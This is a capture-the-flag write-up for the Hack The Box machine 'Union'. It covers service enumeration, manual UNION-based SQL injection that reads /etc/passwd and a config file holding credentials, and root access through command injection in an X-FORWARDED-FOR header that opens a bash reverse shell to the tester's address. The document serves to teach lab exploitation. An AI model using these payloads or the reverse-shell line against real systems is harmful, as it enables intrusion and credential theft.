# HTB: Union

## Engagement Overview

**Target:** Union   
**Local IP:** 10.10.16.9  
**Box IP:** 10.10.11.128  
**Date:** 2025-07-28  

---

### Objectives

- Enumerate services and web endpoints
- Identify SQL Injection vulnerability
- Extract credentials and escalate to SSH access
- Investigate privilege escalation paths
- Retrieve system flags

---

## Service Enumeration

**Nmap Results:**
```bash
nmap -sV -sC -oA nmap/union 10.10.11.128

Nmap scan report for 10.10.11.128
Host is up (0.045s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

**Gobuster Findings:**
```bash
/index.php           (Status: 200) [Size: 1220]
/config.php          (Status: 200) [Size: 0]
/challenge.php       (Status: 200) [Size: 772]
/firewall.php        (Status: 200) [Size: 13]
/.htaccess           (Status: 403)
/.htpasswd           (Status: 403)
```

---

## Methodologies

1. **Web Enumeration** using Gobuster and manual browsing.  
2. **SQL Injection Testing** – manually crafted UNION statements due to SQLMap filters.  
3. **Source Code Review** – extracted credentials from exposed `config.php`.  
4. **Authentication Bypass** – replayed crafted requests (see PoC).  
5. **Post-Exploitation** – leveraged command injection via manipulated `X-FORWARDED-FOR` header.  

---

## Initial Access

**Vulnerability Explanation:**  
The target web application was vulnerable to SQL Injection. SQLMap was filtered, requiring manual UNION statements to extract database contents and read sensitive files.

**SQL Injection Payloads:**

```sql
# curl -s -X POST http://10.10.11.128 -d "player='

-- Dump flag
union select group_concat(one) from flag;-- -" \
  | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo

-- Dump players table
union select group_concat(player) from players;-- -" \
  | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo

-- Read OS release info
union select load_file('/etc/lsb-release');-- -" \
  | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo

-- Read /etc/passwd
union select load_file('/etc/passwd');-- -" \
  | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo

-- Read PHP config file (contains MySQL creds)
union select load_file('/var/www/html/config.php');-- -" \
  | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
```

**HTTP Request (flag.req):**

```http
POST /index.php HTTP/1.1
Host: 10.10.11.128
Content-Length: 12
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=mvi1jq6khbq7p2lh16hs7dntgm

player=union
```

**Penetration:**  
- Crafted UNION SQL statements to retrieve the flag and configuration data.  
- Extracted MySQL credentials from `config.php`.  
- Authenticated to the web application with extracted creds.  
- Application logic enabled SSH (via iptables) upon successful authentication.  

**SSH Access:**  
Logged in successfully using MySQL credentials.  

---

## Privilege Escalation

After gaining shell access, source code analysis revealed the application used an IP whitelisting function based on the `X-FORWARDED-FOR` header.  
This input was unsanitized and allowed direct **command injection**.  

By forging the header with injected commands, root shell access was obtained.  

```bash
# Burp Repeater

GET /firewall.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.128/challenge.php
Connection: close
Cookie: PHPSESSID=orpc54gjbbmaih8loabi2ru7bi
Upgrade-Insecure-Requests: 1
X-FORWARDED-FOR: 1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1";
```

---

## House Cleaning

- Removed enumeration artifacts.  
- Cleared shell history.  
- Left no residual processes or altered configurations.  

---

## Post-Exploitation

**Tools Utilized**  
- `nmap`  
- `gobuster`  
- Burp Suite (for request replay)  
- Manual SQL Injection (UNION)  
- SSH  

**Key Takeaways**  
- SQLMap filters can be bypassed by manual UNION-based injection.  
- Configuration files (`config.php`) often expose credentials.  
- Application logic enabling SSH through iptables demonstrates chained exploitation.  
- Blindly trusting headers (`X-FORWARDED-FOR`) introduces critical injection vectors.  
